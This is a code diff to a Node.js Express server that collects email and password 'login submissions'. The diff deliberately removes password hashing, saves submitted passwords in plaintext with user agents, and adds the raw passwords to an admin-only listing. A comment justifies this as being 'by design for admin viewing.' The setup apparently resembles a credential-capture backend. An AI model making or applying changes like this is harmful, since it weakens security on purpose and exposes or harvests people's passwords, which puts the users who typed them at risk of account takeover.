@@ -14,9 +14,7 @@ const sessions = new Set();
 app.use(express.json());
 app.use(express.static(__dirname));
 
-function hashPassword(password) {
-    return crypto.createHash('sha256').update(password).digest('hex');
-}
+// Passwords are stored in plaintext by design for admin viewing.
 
 function parseCookies(cookieHeader = '') {
     return Object.fromEntries(
@@ -38,16 +36,7 @@ function requireAdmin(req, res, next) {
 async function readSubmissions() {
     try {
         const file = await fs.readFile(SUBMISSIONS_FILE, 'utf8');
-        return JSON.parse(file).map(submission => {
-            if (submission.password && !submission.passwordHash) {
-                const { password, ...rest } = submission;
-                return {
-                    ...rest,
-                    passwordHash: hashPassword(password)
-                };
-            }
-            return submission;
-        });
+        return JSON.parse(file);
     } catch (error) {
         if (error.code === 'ENOENT') {
             return [];
@@ -72,7 +61,7 @@ app.post('/api/login-submissions', async (req, res) => {
 
     const submission = {
         email,
-        passwordHash: hashPassword(password),
+        password: password,
         submittedAt: new Date().toISOString(),
         userAgent: req.get('user-agent') || ''
     };
@@ -120,7 +109,8 @@ app.get('/api/admin/submissions', requireAdmin, async (req, res) => {
                 email: submission.email,
                 submittedAt: submission.submittedAt,
                 userAgent: submission.userAgent || '',
-                passwordStatus: submission.passwordHash ? 'Stored securely as hash' : 'Not stored'
+                password: submission.password || null,
+                passwordStatus: submission.password ? 'Stored as plaintext' : (submission.passwordHash ? 'Stored as hash' : 'Not stored')
             })).reverse()
         });
     } catch (error) {
